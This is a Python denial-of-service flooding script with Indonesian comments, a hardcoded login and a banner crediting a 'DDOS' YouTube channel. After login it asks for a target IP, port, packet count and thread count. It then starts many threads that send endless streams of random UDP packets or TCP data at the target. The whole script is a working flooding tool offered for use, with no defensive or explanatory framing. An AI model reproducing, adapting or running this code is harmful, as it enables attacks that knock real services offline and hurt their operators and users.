#Credit : ZieLx
#Dilarang Mencury
#Kalo mau Rename Credit Nya jan di apus lah kentot

import random
import socket
import os
import time
import threading

os.system("clear")
username =str(input("\033[97m[?] Account :\033[91m "))
password =str(input("\033[97m[?] Password : \033[91m"))
time.sleep(5)
os.system("clear")
print("\033[97m[•••] Correcting...")
time.sleep(3)
print("\033[97m[••] Correcting..")
time.sleep(3)
print("\033[97m[•] Correcting.")
time.sleep(3)
if password == "udpsamp" and username == "DragoN":
	print("\033[97m[!] Login \033[92mSuccessfull!")
	time.sleep(3)
else:
		print("\033[91m[×] Wrong Password,Try Again Later")
		time.sleep(9999999)
os.system("clear")
print("""\033[91m
 (                          )  
 )\ )                    ( /(  
(()/(  (      ) (  (     )\()) 
 /(_)) )(  ( /( )\))( ( ((_)\  
(_))_ (()\ )(_)|(_))\ )\ _((_) 
 |   \ ((_|(_)_ (()(_|(_) \| | 
 | |) | '_/ _` / _` / _ \ .` | 
 |___/|_| \__,_\__, \___/_|\_| 
               |___/           
               
\033[96m>>> Credit : \033[95mZ1
\033[96m>>> Youtube : \033[95mZiel ? DDOS

                                    """)

ip =str(input("\033[96m[•] Ip : \033[91m"))
port =int(input("\033[96m[•] Port : \033[91m"))
times =int(input("\033[96m[•] Packets : \033[91m"))
threads =int(input("\033[96m[•] Threads : \033[91m"))
choice =str(input("\033[96m[?] Ready? (\033[92my\033[97m/\033[91mn\033[96m) \033[97m: \033[92m"))
def run():
	data = random._urandom(1024)
	i = random.choice(("\033[96m[•]","[-]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" \033[91mZ1 Send Packets To Ip: \033[96m{} \033[91mPort: \033[96m{}".format(ip,port))
		except:
				print("\033[96m[$] \033[91mZ1 Send Packets To Ip: \033[96m{} \033[91mPort: \033[96m{}".format(ip,port))
				
def run2():
	data = random._urandom(16)
	i = random.choice(("\033[96m[•]","[$]","[@]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print(i +" \033[91mZ1 Send Packets To Ip: \033[96m{} \033[91mPort: \033[96m{}".format(ip,port))
		except:
				s.close()
				print("\033[96m[$] \033[91mZ1 Send Packets To Ip: \033[96m{} \033[91mPort: \033[96m{}".format(ip,port))
				
def run3():
	data = random._urandom(1025)
	i = random.choice(("\033[96m[+]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
				print(i +" \033[91mZ1 Send Packets To Ip: \033[96m{} \033[91mPort: \033[96m{}".format(ip,port))
		except:
				s.close()
				print("\033[96m[$] \033[91mZ1 Send Packets To Ip: \033[96m{} \033[91mPort: \033[96m{}".format(ip,port))
				
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
	else:
		th = threading.Thread(target = run3)
		th.start()